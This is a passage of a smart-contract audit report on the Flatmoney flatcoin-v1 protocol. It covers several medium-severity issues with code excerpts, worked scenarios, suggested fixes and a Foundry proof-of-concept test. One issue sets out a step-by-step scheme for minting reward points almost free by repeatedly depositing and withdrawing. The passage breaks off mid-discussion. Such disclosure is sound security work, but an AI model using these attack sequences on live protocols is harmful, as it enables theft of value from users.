104:             // The margin change is equal to funding fees accrued to longs and the margin deposited by the trader.
105:->           vault.updateGlobalPositionData({
106:                 price: entryPrice,
107:                 marginDelta: int256(announcedOpen.margin),
108:                 additionalSizeDelta: int256(announcedOpen.additionalSize)
109:             });
......
140:     }
```

L101, [[vault.checkSkewMax](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L296-L307)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L296-L307) internally calculates `longSkewFraction` by the formula `((_globalPositions.sizeOpenedTotal + _additionalSkew) * 1e18) / stableCollateralTotal`. This function guarantees that `longSkewFraction` will not exceed `skewFractionMax` ([[120%](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/scripts/deployment/configs/FlatcoinVault.config.js#L9)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/scripts/deployment/configs/FlatcoinVault.config.js#L9)).

However, `stableCollateralTotal` will [[be updated in updateGlobalPositionData](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L205)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L205).

- When `profitLossTotal` is positive value, then `stableCollateralTotal` will decrease.
- When `profitLossTotal` is negative value, then `stableCollateralTotal` will increase.

Assume the following:

```data
stableCollateralTotal = 90e18
_globalPositions = {  
    sizeOpenedTotal: 100e18,  
    lastPrice: 1800e18,  
}
A new position is to be opened with additionalSize = 5e18.  
fresh price=2000e18
```

We explain it in two situations:

1. `checkSkewMax` is called before `updateGlobalPositionData`.

```data
longSkewFraction = (_globalPositions.sizeOpenedTotal + additionalSize) * 1e18 / stableCollateralTotal 
                 = (100e18 + 5e18) * 1e18 / 90e18 
                 = 1.16667e18 < skewFractionMax(1.2e18)
so checkSkewMax will be passed.
```

2. `checkSkewMax` is called after `updateGlobalPositionData`.

```data
In updateGlobalPositionData:  
PerpMath._profitLossTotal calculates
profitLossTotal = _globalPositions.sizeOpenedTotal * (int256(price) - int256(globalPosition.lastPrice)) / int256(price) 
                = 100e18 * (2000e18 - 1800e18) / 2000e18 = 100e18 * 200e18 /2000e18 
                = 10e18 
_updateStableCollateralTotal(-profitLossTotal) will deduct 10e18 from stableCollateralTotal. 
so stableCollateralTotal = 90e18 - 10e18 = 80e18.  

Now, checkSkewMax is called:  
longSkewFraction = (_globalPositions.sizeOpenedTotal + additionalSize) * 1e18 / stableCollateralTotal 
                 = (100e18 + 5e18) * 1e18 / 80e18 
                 = 1.3125e18 > skewFractionMax(1.2e18)
```

Therefore, **this new position should not be allowed to open, as this will only make the system more skewed towards the long side**.

## Impact

The `stableCollateralTotal` used by `checkSkewMax` is the value of the total profit that has not yet been settled, which is old value. In this way, when the price of collateral rises, it will cause the system to be more skewed towards the long side.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L101-L109

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L166

## Tool used

Manual Review

## Recommendation

```solidity
File: flatcoin-v1\src\LeverageModule.sol
080:     function executeOpen(
081:         address _account,
082:         address _keeper,
083:         FlatcoinStructs.Order calldata _order
084:     ) external whenNotPaused onlyAuthorizedModule returns (uint256 _newTokenId) {
......
101:---      vault.checkSkewMax({additionalSkew: announcedOpen.additionalSize});
102: 
103:         {
104:             // The margin change is equal to funding fees accrued to longs and the margin deposited by the trader.
105:             vault.updateGlobalPositionData({
106:                 price: entryPrice,
107:                 marginDelta: int256(announcedOpen.margin),
108:                 additionalSizeDelta: int256(announcedOpen.additionalSize)
109:             });
+++              vault.checkSkewMax(0); //0 means that vault.updateGlobalPositionData has added announcedOpen.additionalSize.
......
140:     }
```

Also, if `announcedAdjust.additionalSizeAdjustment` is greater than 0 in [[executeAdjust](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L166)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L166), similar fix is required.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: checkSkewMax should be adjusted; medium(6)



**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/266.

# Issue M-5: In executeOrder, OracleModule.getPrice(maxAge) may revert because maxAge is too small 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/170 

## Found by 
Dliteofficial, nobody2018
## Summary

[[executeOrder](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L378-L381)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L378-L381) will call different functions to process the order according to the type of order, and these functions will call `OracleModule.getPrice(maxAge)` to get the price. `maxAge` is equal to the current `block.timestamp - order.executableAtTime`. If `maxAge` is too small (for example, 0-3), then `OracleModule.getPrice(maxAge)` may revert [[here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L132)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L132) even though the price is fresh.

## Vulnerability Detail

Below we use the `LeverageAdjust` type Order to describe this issue.

```data
minExecutabilityAge is 5s  
maxExecutabilityAge is 60s
```

1.  Alice deposits margin on her position A via `DelayedOrder.announceLeverageAdjust`. Because if the price of the collateral continues to dump, position A will be liquidated. A pending `LeverageAdjust` order is created. Assume `block.timestamp = 1707000000`, so `order.executableAtTime = block.timestamp + minExecutabilityAge = 1707000005`. The expiration time of this order is `order.executableAtTime + maxExecutabilityAge = 1707000065`.
2.  The order has `keeperFee` paid to the keeper, so the keepers will compete with each other as long as there is an order that can be executed. One keeper monitored the `FlatcoinEvents.OrderAnnounced` event, it requested the API to obtain `priceUpdateData`. Assume that the fresh price's `publishTime` is 1707000003.
3.  After minExecutabilityAge seconds (block.timestamp=1707000005), the keeper executes the order via `DelayedOrder.executeOrder`. The `priceUpdateData` argument is obtained in step 2. Eventually tx will revert.

Let’s analyze the reasons for revert. The call stack of [[DelayedOrder.executeOrder](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L378-L381)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L378-L381) is as follows:

```flow
DelayedOrder.executeOrder
  //This modifer will write priceUpdatedata to pyth oracle. Note: priceUpdatedata is from step 2
  updatePythPrice(vault, msg.sender, priceUpdateData)
    vault.settleFundingFees()
    _executeLeverageAdjust(account)
      //here checking whether order can be executed
      _prepareExecutionOrder(account, order.executableAtTime)
      LeverageModule.executeAdjust
L152    uint32 maxAge = _getMaxAge(_order.executableAtTime);
L159    (uint256 adjustPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice({
            maxAge: maxAge
        });
        ......
      ......
    ......
  ......
```

L152, `maxAge = block.timestamp - _order.executableAtTime = 1707000005 - 1707000005 = 0`

L159, the `maxAge` argument passed into `OracleModule.getPrice` is 0.

```solidity
File: flatcoin-v1\src\OracleModule.sol
094:     function getPrice(uint32 maxAge) public view returns (uint256 price, uint256 timestamp) {
095:->       (price, timestamp) = _getPrice(maxAge);
096:     }

106:     function _getPrice(uint32 maxAge) internal view returns (uint256 price, uint256 timestamp) {
107:->       (uint256 onchainPrice, uint256 onchainTime) = _getOnchainPrice(); // will revert if invalid
108:->       (uint256 offchainPrice, uint256 offchainTime, bool offchainInvalid) = _getOffchainPrice();
109:         bool offchain;
110: 
111:         uint256 priceDiff = (int256(onchainPrice) - int256(offchainPrice)).abs();
112:         uint256 diffPercent = (priceDiff * 1e18) / onchainPrice;
113:         if (diffPercent > maxDiffPercent) revert FlatcoinErrors.PriceMismatch(diffPercent);
114: 
115:         if (offchainInvalid == false) {
116:             // return the freshest price
117:             if (offchainTime >= onchainTime) {
118:                 price = offchainPrice;
119:                 timestamp = offchainTime;
120:                 offchain = true;
121:             } else {
122:                 price = onchainPrice;
123:                 timestamp = onchainTime;
124:             }
125:         } else {
126:             price = onchainPrice;
127:             timestamp = onchainTime;
128:         }
129: 
130:         // Check that the timestamp is within the required age
131:->       if (maxAge < type(uint32).max && timestamp + maxAge < block.timestamp) {
132:             revert FlatcoinErrors.PriceStale(
133:                 offchain ? FlatcoinErrors.PriceSource.OffChain : FlatcoinErrors.PriceSource.OnChain
134:             );
135:         }
136:     }
```

L107, onchainTime = `updatedAt` returned by `oracle.latestRoundData()` from chainlink. `updatedAt` depends on the symbol's heartBeat. The heartbeats of almost chainlink price feeds are based on hours (such as 24 hours, 1 hour, etc.). Therefore, `onchainTime` is always lagging time, and the probability of being equal to `block.timestamp` is low. 

L108, `offchainTime = publishTime of priceUpdateData = 1707000003`

L117-124, `timestamp = max(onchainTime, offchainTime)`, in most cases `offchainTime` is larger.

L131, in this case `maxAge=0`,

```data
maxAge < type(uint32).max && timestamp + maxAge < block.timestamp =>
0 < type(uint32).max && 1707000003 + 0 < 1707000005 =>
0 < type(uint32).max && 1707000003 < 1707000005
```

So if statement is met, tx revert.

## Impact

- Pending orders cannot be executed in time. For time-sensitive protocol, this is unacceptable.
- The keeper obviously submitted the fresh price, but the tx failed with `FlatcoinErrors.PriceStale`.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L94-L96

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L159-L161

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L270-L272

## Tool used

Manual Review

## Recommendation

The cases in the report need to be considered.

```fix
File: flatcoin-v1\src\LeverageModule.sol
449:     function _getMaxAge(uint64 _executableAtTime) internal view returns (uint32 _maxAge) {
450:-        return (block.timestamp - _executableAtTime).toUint32();
450:+        return (block.timestamp - _executableAtTime + vault.minExecutabilityAge()).toUint32();
451:     }
```



## Discussion

**nevillehuang**

Request PoC to facilitate discussion between sponsor and watson

Sponsor comments:

> From practice, it's not true. Pyth Network price feeds update once per second

**sherlock-admin2**

PoC requested from @securitygrid

Requests remaining: **11**

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid:  this semm valid to me; medium(10)



**securitygrid**

copy the following POC to test/unit/Common/CancelOrder.t.sol:
```
function test_170() public {
        setWethPrice(2000e8);
        skip(120);

        // First deposit mint doesn't use offchain oracle price
        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: 100e18,
            oraclePrice: 2000e8,
            keeperFeeAmount: 0
        });

        announceOpenLeverage({traderAccount: alice, margin: 100e18, additionalSize: 100e18, keeperFeeAmount: 0});
        //keeper got offchain price before order.executableAtTime
        skip(vaultProxy.minExecutabilityAge() - 1);
        bytes[] memory priceUpdateData = getPriceUpdateData(2000e8);
        //In order to compete for tradeFee, the keeper must execute orders as quickly as possible.
        skip(vaultProxy.minExecutabilityAge());
        vm.prank(keeper);
        delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateData);
    }
    function test_170_for_sponor() public {
        //From sponor's comment: From practice, it's not true. Pyth Network price feeds update once per second
        setWethPrice(2000e8);
        skip(120);

        // First deposit mint doesn't use offchain oracle price
        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: 100e18,
            oraclePrice: 2000e8,
            keeperFeeAmount: 0
        });

        announceOpenLeverage({traderAccount: alice, margin: 100e18, additionalSize: 100e18, keeperFeeAmount: 0});
        //keeper got offchain price before order.executableAtTime
        skip(vaultProxy.minExecutabilityAge() - 1);
        bytes[] memory priceUpdateDataOld = getPriceUpdateData(2000e8);
        //In order to compete for tradeFee, the keeper must execute orders as quickly as possible.
        skip(vaultProxy.minExecutabilityAge());
        //In same block, other keeper or other project updates price. Therefore, such a situation is ok.
        bytes[] memory priceUpdateDataNew = getPriceUpdateData(2000e8);
        mockPyth.updatePriceFeeds{value: 1}(priceUpdateDataNew);
        //keeper executes order.
        vm.prank(keeper);
        delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateDataOld);
    }
/**output
Running 2 tests for test/unit/Common/CancelOrder.t.sol:CancelDepositTest
[FAIL. Reason: PriceStale(1)] test_170() (gas: 1329703)
[PASS] test_170_for_sponor() (gas: 1347073)
Test result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 29.11ms
**/
```

**D-Ig**

hey, as far as I understood this whole report is based on the scenario that keeper monitors `OrderAnnounced` events and then immediately after queries pyth API to get the price update message and then waits `minExecutabilityAge` before execution. 

this is the wrong flow, as our keeper monitors events and does not query anything before `minExecutabilityAge`. pyth API is fetched after `minExecutabilityAge` and then call to execute order is made.

**securitygrid**

@D-Ig 

A pending order can be executed at [t0,t1].
The average block time of base is 2 seconds.
A well-developed keeper can make tx to be mined at t0. The purpose is to get keeperFee(First come, first served).
Therefore, the price must be obtained before t0.

> this is the wrong flow, as our keeper monitors events and does not query anything before minExecutabilityAge. pyth API is fetched after minExecutabilityAge and then call to execute order is made.

If the keeper can only come from the protocol, then I will not submit this report. The protocol hopes that that the more keepers the better.
Please reconsider this issue, thank you.

**nevillehuang**

Hi @rashtrakoff @D-Ig any further comments on the above highlighted comment?

**D-Ig**

> Hi @rashtrakoff @D-Ig any further comments on the above highlighted comment?

I don't know what else to add. for me it's a chicken and egg problem

**rashtrakoff**

Let's take a look at the statement which might create an issue:

    `timestamp + maxAge < block.timestamp`

Since `maxAge = block.timestamp - order.executableAtTime`

This can also be re-written as:

    `timestamp < order.executableAtTime`

Basically what I mean is that the price fetched from pyth API should be newer than executable at time. I believe this is what we intended anyway so I wouldn't consider this as an issue.

**securitygrid**

> A pending order can be executed at [t0,t1].

The problem described in this report is that the order can never be executed at t0. Because it takes time for a tx to be created, sent to the node and finally mined. The price timestamp is obtained when tx is created. Therefore it is smaller than t0.

# Issue M-6: Oracle will not failover as expected during liquidation 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/177 

## Found by 
0xLogos, Stryder, alexzoid, evmboi32, ge6a, gqrp, jennifer37, nobody2018, trauki, xiaoming90
## Summary

Oracle will not failover as expected during liquidation. If the liquidation cannot be executed due to the revert described in the following scenario, underwater positions and bad debt accumulate in the protocol, threatening the solvency of the protocol.

## Vulnerability Detail

The liquidators have the option to update the Pyth price during liquidation. If the liquidators do not intend to update the Pyth price during liquidation, they have to call the second `liquidate(uint256 tokenId)` function at Line 85 below directly, which does not have the `updatePythPrice` modifier.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L75

```solidity
File: LiquidationModule.sol
75:     function liquidate(
76:         uint256 tokenID,
77:         bytes[] calldata priceUpdateData
78:     ) external payable whenNotPaused updatePythPrice(vault, msg.sender, priceUpdateData) {
79:         liquidate(tokenID);
80:     }
81: 
82:     /// @notice Function to liquidate a position.
83:     /// @dev One could directly call this method instead of `liquidate(uint256, bytes[])` if they don't want to update the Pyth price.
84:     /// @param tokenId The token ID of the leverage position.
85:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
86:         FlatcoinStructs.Position memory position = vault.getPosition(tokenId);
```

It was understood from the protocol team that the rationale for allowing the liquidators to execute a liquidation without updating the Pyth price is to ensure that the liquidations will work regardless of Pyth's working status, in which case Chainlink is the fallback, and the last oracle price will be used for the liquidation.

However, upon further review, it was found that the fallback mechanism within the FlatCoin protocol does not work as expected by the protocol team.

Assume that Pyth is down. In this case, no one would be able to fetch the latest off-chain price from Pyth network and update Pyth on-chain contract. As a result, the prices stored in the Pyth on-chain contract will become outdated and stale. 

When liquidation is executed in FlatCoin protocol, the following `_getPrice` function will be executed to fetch the price. Line 107 below will fetch the latest price from Chainlink, while Line 108 below will fetch the last available price on the Pyth on-chain contract. When the Pyth on-chain prices have not been updated for a period of time, the deviation between `onchainPrice` and `offchainPrice` will widen till a point where `diffPercent > maxDiffPercent` and a revert will occur at Line 113 below, thus blocking the liquidation from being carried out. As a result, the liquidation mechanism within the FlatCoin protocol will stop working.

Also, the protocol team's goal of allowing the liquidators to execute a liquidation without updating the Pyth price to ensure that the liquidations will work regardless of Pyth's working status will not be achieved.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L113

```solidity
File: OracleModule.sol
102:     /// @notice Returns the latest 18 decimal price of asset from either Pyth.network or Chainlink.
103:     /// @dev It verifies the Pyth network price against Chainlink price (ensure that it is within a threshold).
104:     /// @return price The latest 18 decimal price of asset.
105:     /// @return timestamp The timestamp of the latest price.
106:     function _getPrice(uint32 maxAge) internal view returns (uint256 price, uint256 timestamp) {
107:         (uint256 onchainPrice, uint256 onchainTime) = _getOnchainPrice(); // will revert if invalid
108:         (uint256 offchainPrice, uint256 offchainTime, bool offchainInvalid) = _getOffchainPrice();
109:         bool offchain;
110: 
111:         uint256 priceDiff = (int256(onchainPrice) - int256(offchainPrice)).abs();
112:         uint256 diffPercent = (priceDiff * 1e18) / onchainPrice;
113:         if (diffPercent > maxDiffPercent) revert FlatcoinErrors.PriceMismatch(diffPercent);
114: 
115:         if (offchainInvalid == false) {
116:             // return the freshest price
117:             if (offchainTime >= onchainTime) {
118:                 price = offchainPrice;
119:                 timestamp = offchainTime;
120:                 offchain = true;
121:             } else {
122:                 price = onchainPrice;
123:                 timestamp = onchainTime;
124:             }
125:         } else {
126:             price = onchainPrice;
127:             timestamp = onchainTime;
128:         }
129: 
130:         // Check that the timestamp is within the required age
131:         if (maxAge < type(uint32).max && timestamp + maxAge < block.timestamp) {
132:             revert FlatcoinErrors.PriceStale(
133:                 offchain ? FlatcoinErrors.PriceSource.OffChain : FlatcoinErrors.PriceSource.OnChain
134:             );
135:         }
136:     }
```

## Impact

The liquidation mechanism is the core component of the protocol and is important to the solvency of the protocol. If the liquidation cannot be executed due to the revert described in the above scenario, underwater positions and bad debt accumulate in the protocol threaten the solvency of the protocol.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L75

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L113C10-L113C92

## Tool used

Manual Review

## Recommendation

Consider implementing a feature to allow the protocol team to disable the price deviation check so that the protocol team can disable it in the event that Pyth network is down for an extended period of time.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: high(4)



**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/270.

# Issue M-7: Revert when adjusting the position 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/178 

## Found by 
qmdddd, shaka, xiaoming90


## Summary

The margin adjustment will revert unexpectedly when executing. Margin adjustment is time-sensitive as long traders often rely on it to increase their position's margin when their positions are on the verge of being liquidated to avoid liquidation.

If the margin adjustment fails to execute due to an inherent bug within its implementation, the user's position might be liquidated as the transaction to increase its margin fails to execute, leading to a loss of assets for the traders.

## Vulnerability Detail

When announcing an adjustment order, if the `marginAdjustment` is larger than 0, `marginAdjustment + totalFee` number of collateral will be transferred from the user account to the `DelayedOrder` contract. The `totalFee` comprises the keeper fee + trade fee.

Let's denote `marginAdjustment` as $M$, keeper fee as $K$, and trade fee as $T$. Thus, the balance of `DelayedOrder` is increased by $(M + K + T)$ rETH.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L303

```solidity
File: DelayedOrder.sol
217:     function announceLeverageAdjust(
..SNIP..
300:         // If user increases margin, fees are charged from their account.
301:         if (marginAdjustment > 0) {
302:             // Sending positive margin adjustment and both fees from the user to the delayed order contract.
303:             vault.collateral().safeTransferFrom(msg.sender, address(this), uint256(marginAdjustment) + totalFee);
304:         }
```

When the keeper executes the adjustment order, the following function calls will happen:

```solidity
DelayedOrder.executeOrder() => DelayedOrder._executeLeverageAdjust() => LeverageModule.executeAdjust()
```

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L137

```solidity
File: LeverageModule.sol
147:     function executeAdjust(
..SNIP..
234:         // Sending keeper fee from order contract to the executor.
235:         vault.sendCollateral({to: _keeper, amount: _order.keeperFee});
```

When the `LeverageModule.executeAdjust` function is executed, it will instruct the FlatCoin vault to send the $K$ rETH (keeper fee) to the keeper address. Thus, the amount of rETH held by the vault is reduced by $K$. However, in an edge case where the amount of rETH held by the vault is $V$ and $V < K$, the transaction will revert. 

This is because, at this point, the `DelayedOrder` contract has not forwarded the keeper fee it collected from the users to the FlatCoin vault yet. The keeper fee is only forwarded to the vault after the `executeAdjust` function is executed at Line 608 below, which is too late in the above-described edge case.

This edge case might occur if there is low liquidity in the vault, a high keeper fee in the market, or a combination of both. Thus, the implementation should not assume that there is always sufficient liquidity in the vault to pay the keeper in advance and collect the keeper fee from the `DelayedOrder` contract later.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L303

```solidity
File: DelayedOrder.sol
586:     /// @notice Execution of user delayed leverage adjust order.
587:     /// @dev Uses the Pyth network price to execute.
588:     /// @param account The user account which has a pending order.
589:     function _executeLeverageAdjust(address account) internal {
590:         FlatcoinStructs.Order memory order = _announcedOrder[account];
591:         FlatcoinStructs.AnnouncedLeverageAdjust memory leverageAdjust = abi.decode(
592:             order.orderData,
593:             (FlatcoinStructs.AnnouncedLeverageAdjust)
594:         );
595: 
596:         _prepareExecutionOrder(account, order.executableAtTime);
597: 
598:         ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).executeAdjust({
599:             account: account,
600:             keeper: msg.sender,
601:             order: order
602:         });
603: 
604:         if (leverageAdjust.marginAdjustment > 0) {
605:             // Sending positive margin adjustment and fees from delayed order contract to the vault
606:             vault.collateral().safeTransfer({
607:                 to: address(vault),
608:                 value: uint256(leverageAdjust.marginAdjustment) + leverageAdjust.tradeFee + order.keeperFee
609:             });
610:         }
```

## Impact

The margin adjustment will revert unexpectedly when executing, as shown in the scenario above. Margin adjustment is time-sensitive as long traders often rely on it to increase their position's margin when their positions are on the verge of being liquidated to avoid liquidation.

If the margin adjustment fails to execute due to an inherent bug within its implementation, the user's position might be liquidated as the transaction to increase its margin fails to execute, leading to a loss of assets for the traders.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L303

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L137

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L303

## Tool used

Manual Review

## Recommendation

Consider transferring the keeper fee to the vault first before sending it to the keeper's address to ensure that the transfer of the keeper fee will work under all circumstances.

```diff
function _executeLeverageAdjust(address account) internal {
    FlatcoinStructs.Order memory order = _announcedOrder[account];
    FlatcoinStructs.AnnouncedLeverageAdjust memory leverageAdjust = abi.decode(
        order.orderData,
        (FlatcoinStructs.AnnouncedLeverageAdjust)
    );

    _prepareExecutionOrder(account, order.executableAtTime);

+    if (leverageAdjust.marginAdjustment > 0) {
+        // Sending positive margin adjustment and fees from delayed order contract to the vault
+        vault.collateral().safeTransfer({
+            to: address(vault),
+            value: uint256(leverageAdjust.marginAdjustment) + leverageAdjust.tradeFee + order.keeperFee
+        });
+    }

    ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).executeAdjust({
        account: account,
        keeper: msg.sender,
        order: order
    });

-    if (leverageAdjust.marginAdjustment > 0) {
-        // Sending positive margin adjustment and fees from delayed order contract to the vault
-        vault.collateral().safeTransfer({
-            to: address(vault),
-            value: uint256(leverageAdjust.marginAdjustment) + leverageAdjust.tradeFee + order.keeperFee
-        });
-    }
```



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: medium(9)



**sherlock-admin**

The protocol team fixed this issue in PR/commit  https://github.com/dhedge/flatcoin-v1/pull/272.

# Issue M-8: Large amounts of points can be minted virtually without any cost 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/187 

## Found by 
Bauer, Dliteofficial, GoSlang, evmboi32, jennifer37, joicygiore, nobody2018, novaman33, vesla0xfa, xiaoming90
## Summary

Large amounts of points can be minted virtually without any cost. The points are intended to be used to exchange something of value. A malicious user could abuse this to obtain a large number of points, which could obtain excessive value and create unfairness among other protocol users.

## Vulnerability Detail

When depositing stable collateral, the LPs only need to pay for the keeper fee. The keeper fee will be sent to the caller who executed the deposit order.

When withdrawing stable collateral, the LPs need to pay for the keeper fee and withdraw fee. However, there is an instance where one does not need to pay for the withdrawal fee. Per the condition at Line 120 below, if the `totalSupply` is zero, this means that it is the final/last withdrawal. In this case, the withdraw fee will not be applicable and remain at zero.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L96

```solidity
File: StableModule.sol
096:     function executeWithdraw(
097:         address _account,
098:         uint64 _executableAtTime,
099:         FlatcoinStructs.AnnouncedStableWithdraw calldata _announcedWithdraw
100:     ) external whenNotPaused onlyAuthorizedModule returns (uint256 _amountOut, uint256 _withdrawFee) {
101:         uint256 withdrawAmount = _announcedWithdraw.withdrawAmount;
..SNIP..
112:         _burn(_account, withdrawAmount);
..SNIP..
118:         // Check that there is no significant impact on stable token price.
119:         // This should never happen and means that too much value or not enough value was withdrawn.
120:         if (totalSupply() > 0) {
121:             if (
122:                 stableCollateralPerShareAfter < stableCollateralPerShareBefore - 1e6 ||
123:                 stableCollateralPerShareAfter > stableCollateralPerShareBefore + 1e6
124:             ) revert FlatcoinErrors.PriceImpactDuringWithdraw();
125: 
126:             // Apply the withdraw fee if it's not the final withdrawal.
127:             _withdrawFee = (stableWithdrawFee * _amountOut) / 1e18;
128: 
129:             // additionalSkew = 0 because withdrawal was already processed above.
130:             vault.checkSkewMax({additionalSkew: 0});
131:         } else {
132:             // Need to check there are no longs open before allowing full system withdrawal.
133:             uint256 sizeOpenedTotal = vault.getVaultSummary().globalPositions.sizeOpenedTotal;
134: 
135:             if (sizeOpenedTotal != 0) revert FlatcoinErrors.MaxSkewReached(sizeOpenedTotal);
136:             if (stableCollateralPerShareAfter != 1e18) revert FlatcoinErrors.PriceImpactDuringFullWithdraw();
137:         }
```

When LPs deposit rETH and mint UNIT, the protocol will mint points to the depositor's account as per Line 84 below.

Assume that the vault has been newly deployed on-chain. Bob is the first LP to deposit rETH into the vault. Assume for a period of time (e.g., around 30 minutes), there are no other users depositing into the vault except for Bob.

Bob could perform the following actions to mint points for free:

- Bob announces a deposit order to deposit 100e18 rETH. Paid for the keeper fee. (Acting as a LP).
- Wait 10 seconds for the `minExecutabilityAge` to pass
- Bob executes the deposit order and mints 100e18 UNIT (Exchange rate 1:1). Protocol also mints 100e18 points to Bob's account. Bob gets back the keeper fee. (Acting as Keeper)
- Immediately after his `executeDeposit` TX, Bob inserts an "announce withdraw order" TX to withdraw all his 100e18 UNIT and pay for the keeper fee.
- Wait 10 seconds for the `minExecutabilityAge` to pass
- Bob executes the withdraw order and receives back his initial investment of 100e18 rETH. Since he is the only LP in the protocol, it is considered the final/last withdrawal, and he does not need to pay any withdraw fee. He also got back his keeper fee. (Acting as Keeper)

Each attack requires 20 seconds (10 + 10) to be executed. Bob could rinse and repeat the attack until he was no longer the only LP in the system, where he had to pay for the withdraw fee, which might make this attack unprofitable.

If Bob is the only LP in the system for 30 minutes, he could gain 9000e18 points (`(30 minutes / 20 seconds) * 100e18` ) for free as Bob could get back his keeper fee and does not incur any withdraw fee. The only thing that Bob needs to pay for is the gas fee, which is extremely cheap on L2 like Base.

```solidity
File: StableModule.sol
61:     function executeDeposit(
62:         address _account,
63:         uint64 _executableAtTime,
64:         FlatcoinStructs.AnnouncedStableDeposit calldata _announcedDeposit
65:     ) external whenNotPaused onlyAuthorizedModule returns (uint256 _liquidityMinted) {
66:         uint256 depositAmount = _announcedDeposit.depositAmount;
..SNIP..
70:         _liquidityMinted = (depositAmount * (10 ** decimals())) / stableCollateralPerShare(maxAge);
..SNIP..
75:         _mint(_account, _liquidityMinted);
76: 
77:         vault.updateStableCollateralTotal(int256(depositAmount));
..SNIP..
82:         // Mint points
83:         IPointsModule pointsModule = IPointsModule(vault.moduleAddress(FlatcoinModuleKeys._POINTS_MODULE_KEY));
84:         pointsModule.mintDeposit(_account, _announcedDeposit.depositAmount);
```

## Impact

Large amounts of points can be minted virtually without any cost. The points are intended to be used to exchange something of value. A malicious user could abuse this to obtain a large number of points, which could obtain excessive value from the protocol and create unfairness among other protocol users.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L96

## Tool used

Manual Review

## Recommendation

One approach that could mitigate this risk is also to impose withdraw fee for the final/last withdrawal so that no one could abuse this exception to perform any attack that was once not profitable due to the need to pay withdraw fee.

In addition, consider deducting the points once a position is closed or reduced in size so that no one can attempt to open and adjust/close a position repeatedly to obtain more points.



## Discussion

**sherlock-admin**

2 comment(s) were left on this issue during the judging contest.

**0xLogos** commented:
> low/info, points != funds

**takarez** commented:
>  invalid



**nevillehuang**

@rashtrakoff Any reason why this issue was disputed? What are the points FMP for?

I believe large amount of points shouldn't be freely minted.

**rashtrakoff**

